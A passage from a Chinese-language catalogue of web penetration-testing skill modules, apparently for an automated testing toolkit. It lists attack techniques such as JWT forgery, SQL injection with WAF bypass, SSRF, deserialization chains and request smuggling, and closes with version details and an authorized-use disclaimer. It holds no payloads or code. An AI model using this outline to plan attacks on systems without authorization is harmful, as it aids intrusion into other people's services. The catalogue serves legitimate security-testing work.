| graphql-and-hidden-parameters | GraphQL 内省、批量查询、隐藏参数发现 |

### 认证与授权

| 技能 | 核心内容 |
|---|---|
| auth-sec | 认证测试分类路由 |
| authbypass-authentication-flaws | 密码重置 22 模式矩阵、验证码绕过 20 方法、不安全随机数 |
| jwt-oauth-token-attacks | JWT 算法混淆、密钥混淆、声明篡改、JWKS 滥用 |
| oauth-oidc-misconfiguration | OAuth 流程劫持、OIDC 配置错误 |
| saml-sso-assertion-attacks | SAML 断言篡改、SSO 绕过 |
| idor-broken-object-authorization | 8 类系统化 IDOR 测试、ORM 过滤链泄露 |

### 注入攻击

| 技能 | 核心内容 |
|---|---|
| injection-checking | 注入测试分类路由 |
| xss-cross-site-scripting | Polyglot payload 库、WAF 绕过、CSP 绕过 |
| sqli-sql-injection | 多数据库专题、SQLite RCE、WAF 绕过矩阵 |
| ssrf-server-side-request-forgery | 云元数据 6 平台矩阵、DNS 重绑定、Gopher/Redis RCE |
| ssti-server-side-template-injection | 15+ 引擎覆盖、盲注 SSTI、Flask PIN 计算 |
| cmdi-command-injection | WAF 绕过、PHP disable_functions 绕过、组件级 RCE |
| nosql-injection | 盲注自动化、重复键绕过、聚合管道注入 |
| xxe-xml-external-entity | 本地 DTD 注入、盲 XXE、Gopher/FTP OOB |
| deserialization-insecure | Java/PHP/Python/.NET 反序列化链 |
| expression-language-injection | SpEL、OGNL、Java EL 注入 |
| jndi-injection | JNDI/LDAP/RMI 利用、Log4Shell 模式 |
| crlf-injection | 头注入、HTTP 响应拆分 |
| request-smuggling | CL.TE/TE.CL/TE.TE、HTTP/2 降级走私 |
| prototype-pollution | Express 黑盒探测、EJS/Kibana Gadget 链 |
| type-juggling | PHP 松散比较表、Magic Hash |
| http-parameter-pollution | 服务器行为矩阵、HPP+WAF 绕过 |
| xslt-injection | 三条 RCE 链、EXSLT 写文件 |
| csv-formula-injection | DDE/rundll32 payload |

### 文件与路径攻击

| 技能 | 核心内容 |
|---|---|
| file-access-vuln | 文件访问测试分类路由 |
| path-traversal-lfi | LFI→RCE、PHP Wrapper 矩阵、pearcmd |
| upload-insecure-files | 成功率公式、验证缺陷五维分类、解析技巧 |

### 业务逻辑与会话

| 技能 | 核心内容 |
|---|---|
| business-logic-vuln | 业务逻辑测试分类路由 |
| business-logic-vulnerabilities | 支付篡改矩阵、状态机绕过、竞态 |
| race-condition | TOCTOU 模型、HTTP/2 单包攻击 |
| csrf-cross-site-request-forgery | JSON CSRF、Multipart CSRF |
| clickjacking | Frame 攻击、X-Frame-Options 绕过 |
| cors-cross-origin-misconfiguration | Origin 反射、null origin |
| open-redirect | 重定向链滥用、Tabnabbing |
| web-cache-deception | 路径混淆、缓存键操控 |

### 基础设施与供应链

| 技能 | 核心内容 |
|---|---|
| unauthorized-access-common-services | 服务暴露清单、反向代理配置错误 |
| insecure-source-code-management | .git/.svn 恢复、备份文件模式 |
| dependency-confusion | npm/pip/gem 注册表劫持 |
| websocket-security | CSWSH、Origin 验证 |

---

## 十、版本信息

- **版本**：v1.0
- **更新日期**：2026-07-16
- **包含Skill数量**：6层 × 40+ Skill
- **协作链路**：13条核心攻击链路 + 7条典型场景组合
- **脚本数量**：6个核心安全脚本
- **工具数量**：200+ 安全工具配置

---

*本文档仅用于教育和授权安全测试目的，请在合法范围内使用。*